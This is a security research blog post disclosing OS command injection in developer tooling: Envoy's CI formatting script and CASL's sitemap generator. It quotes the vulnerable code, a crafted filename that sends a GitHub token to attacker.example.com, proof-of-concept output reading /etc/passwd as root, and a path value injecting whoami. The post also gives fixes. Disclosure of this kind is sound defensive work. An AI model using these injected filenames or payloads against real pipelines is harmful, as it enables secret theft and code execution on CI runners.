---
layout: post
title: "Trusted by Default, Dangerous by Design: How Example Code and Dev Tools Become Attack Vectors"
date: 2026-02-23
category: research
tags: ["command-injection", "CI/CD", "supply-chain", "CWE-78", "developer-tools"]
---

There's an unwritten rule in software development: **if it's in the repo, it's probably safe.** Developers trust example code, CI scripts, and bundled tools almost unconditionally. After all, they come from the maintainers. They're part of the project. They must have been reviewed.

Except, often, they haven't.

During recent research, I found OS Command Injection vulnerabilities in the **developer tooling** of two separate open-source projects — not in the products themselves, but in the scripts and examples that ship alongside them. The kind of code that developers copy, adapt, and run in their own pipelines without a second thought.

This post is about that blind spot.

## The Blind Trust Problem

When a developer integrates a new library, the first thing they do is look at the examples. They check the `/tools` directory. They read the README and follow the setup scripts.

This code occupies a unique trust zone:

- It's **inside the official repository**, so it inherits the project's reputation.
- It's **not the core product**, so it rarely gets the same security scrutiny.
- It's **meant to be copied and adapted**, so vulnerabilities in it propagate to every downstream user.

The result is a category of code that is simultaneously the most trusted and the least audited. And when that code interacts with the shell — which developer tools frequently do — the consequences can be severe.

## Case Study 1: Envoy — CI Formatting Tool to Root Shell

[Envoy](https://github.com/envoyproxy/envoy) is one of the most widely deployed service proxies in the cloud-native ecosystem. It powers the data plane for Istio, is a CNCF graduated project, and is trusted by organizations handling massive-scale production traffic.

The vulnerability I found wasn't in Envoy's proxy code. It was in `tools/code_format/check_format.py` — a Python script used in CI to enforce code formatting standards on incoming pull requests.

### The Vulnerable Pattern

The script constructs shell commands by directly interpolating file paths into format strings, then executes them via `os.system()` and `subprocess.check_output(shell=True)` — **without any sanitization**.

```python
# Line 917-918 — clang_format()
command = (
    f"{self.config.clang_format_path} {file_path} | diff {file_path} -"
    if check else f"{self.config.clang_format_path} -i {file_path}")
```

```python
# Line 898 — execute_command() (the sink)
output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).strip()
```

The `file_path` variable flows directly from the list of changed files in a pull request. There are **six distinct injection points** across the script — in `fix_build_path()`, `check_build_path()`, `clang_format()`, and the shared `execute_command()` sink.

The `normalize_path()` function only adjusts path prefixes (`./`) — it performs zero sanitization of shell metacharacters.

### The Attack Chain

The exploitation path is straightforward:

1. An attacker forks the Envoy repository.
2. They create a file with a malicious filename, such as:
   ```
   source/common/; curl https://attacker.example.com/exfil?t=$(cat /run/secrets/GITHUB_TOKEN) ; #.cc
   ```
3. They open a pull request. CI triggers automatically.
4. `check_format.py` processes the file list. The malicious filename reaches `clang_format()`, and after f-string interpolation the shell sees:
   ```
   clang-format source/common/; curl https://attacker.example.com/exfil?t=$(cat /run/secrets/GITHUB_TOKEN) ; #.cc | diff ...
   ```
5. The shell splits on `;` and executes the injected command with full CI runner privileges.

**No human review needed. No special permissions. Just a pull request.**

### Proof of Concept

I built a self-contained Docker-based PoC that simulates a CI runner processing a file with a crafted filename. The results speak for themselves:

```
[Test 1] Payload: cat /etc/passwd (via injected filename)
------------------------------------------------------------
  ERROR: From /tmp/poc_test/; pwn ; #.cc
  ERROR: === INJECTED COMMAND OUTPUT (cat /etc/passwd) ===
  ERROR: root:x:0:0:root:/root:/bin/bash
  ERROR: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  [...]

  >> RESULT: /etc/passwd content found — INJECTION SUCCESSFUL

[Test 2] Payload: id
------------------------------------------------------------
  ERROR: From /tmp/poc_test/; id ; #.cc
  ERROR: uid=0(root) gid=0(root) groups=0(root)

  >> RESULT: 'id' output found — INJECTION SUCCESSFUL
```

Root-level execution on the CI runner. From a filename.

## Case Study 2: CASL — Example Tool to Command Injection

[CASL](https://github.com/stalniy/casl) is a popular JavaScript authorization library used to manage permissions in web applications. It's well-regarded and widely adopted.

Again, the vulnerability wasn't in CASL's core authorization logic. It was in a **tool script** — `tools/sitemap.xml.js` — a sitemap generator that ships with the project as a development utility.

### The Vulnerable Pattern

The `getLastModified` function uses `child_process.exec` to run a `git` command, directly concatenating the `path` parameter into the command string:

```javascript
async function getLastModified(path) {
  const { stdout, stderr } = await exec(
    `git log -1 --format="%aI" ${CONTENT_PATH}/${path}`
  );
  // ...
}
```

Since `exec` spawns a full shell, any shell metacharacters in `path` — such as `;`, `&`, `|`, or `$()` — are interpreted. And the `path` values come from configuration files like `routes.yml`, which can be modified by contributors or influenced in CI/CD environments.

### The Attack

By injecting `app/en.yml; whoami 1>&2; #` as a path value, the shell executes:

```bash
git log -1 --format="%aI" docs/src/content/app/en.yml; whoami 1>&2; #
```

The `git` command runs normally, then `whoami` executes, and `#` comments out the rest. The output confirms code execution.

### Why This Matters

A developer integrating CASL who needs a sitemap generator might look at the project's tools directory and think: *"They already have one — let me just use this."* They copy the script, maybe adapt it slightly, wire it into their build pipeline, and move on.

They've just imported a command injection vulnerability into their CI/CD infrastructure.

## The Pattern: Shell + String Interpolation + Trust

Both vulnerabilities share the exact same root cause:

| Component | Envoy | CASL |
|---|---|---|
| **Language** | Python | JavaScript |
| **Dangerous API** | `os.system()`, `subprocess.check_output(shell=True)` | `child_process.exec()` |
| **Input source** | File paths from PR diff | Path values from config/routes |
| **Sanitization** | None | None |
| **CWE** | CWE-78 | CWE-78 |

The formula is always the same:

```
untrusted_input + string_interpolation + shell_execution = command_injection
```

This isn't a novel attack technique. OS Command Injection is well-understood. It has its own CWE entry (CWE-78), it's in the OWASP Top 10, and every security course covers it in week one.

And yet it keeps showing up — specifically in developer tools, because **nobody audits them**.

## The Broader Implication: Supply Chain Through the Side Door

The security community has invested heavily in securing dependencies — SBOMs, signed packages, dependency scanning, reproducible builds. But developer tools and example code represent a parallel supply chain that largely goes unexamined.

Consider:

- **CI scripts** run with elevated privileges and access to deployment secrets.
- **Example code** is copied and pasted into production systems.
- **Tool scripts** are integrated into build pipelines where they process untrusted input.

An attacker doesn't need to compromise a package registry or poison a dependency. They just need to exploit a tool that's already trusted because it lives in the repo.

## Recommendations

**For library maintainers:**
- Apply the same security review process to `/tools`, `/examples`, and CI scripts as you do to core code.
- Never use `shell=True` (Python) or `child_process.exec` (Node.js) with interpolated strings. Use list-based arguments with `subprocess.run()` or `child_process.execFile()`.
- If shell execution is unavoidable, sanitize inputs with `shlex.quote()` (Python) or dedicated escaping functions.

**For developers consuming libraries:**
- Do not blindly copy tool/example code into your projects or pipelines.
- Audit any script that runs in CI — especially if it processes filenames, paths, or user-influenced configuration.
- Grep for `os.system`, `shell=True`, `child_process.exec`, and similar patterns in any code you import.

**For security teams:**
- Expand SAST rules to cover tool and example directories, not just `src/`.
- Treat CI pipeline code as security-critical infrastructure.
- Include developer tooling in your threat model.

## Key Takeaways

**The most dangerous code is the code nobody reviews.** Core libraries get audited. Tools and examples get a pass. Attackers know this.

**Developer tools are a supply chain vector.** When a CI script runs `os.system()` on pull request data, it's as dangerous as any RCE in production — maybe more, because it has access to secrets and deployment credentials.

**Trust is not transitive.** Just because a project is well-maintained doesn't mean every file in its repository has been security-reviewed. A CNCF-graduated project and a popular npm package both had the same textbook vulnerability hiding in their tooling.

**The fix is almost always trivial.** In both cases, replacing shell string interpolation with parameterized execution would have eliminated the vulnerability entirely. The cost of prevention is negligible compared to the cost of exploitation.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [Envoy Proxy — CNCF Graduated Project](https://www.envoyproxy.io/)
- [CASL — Authorization Library for JavaScript](https://casl.js.org/)
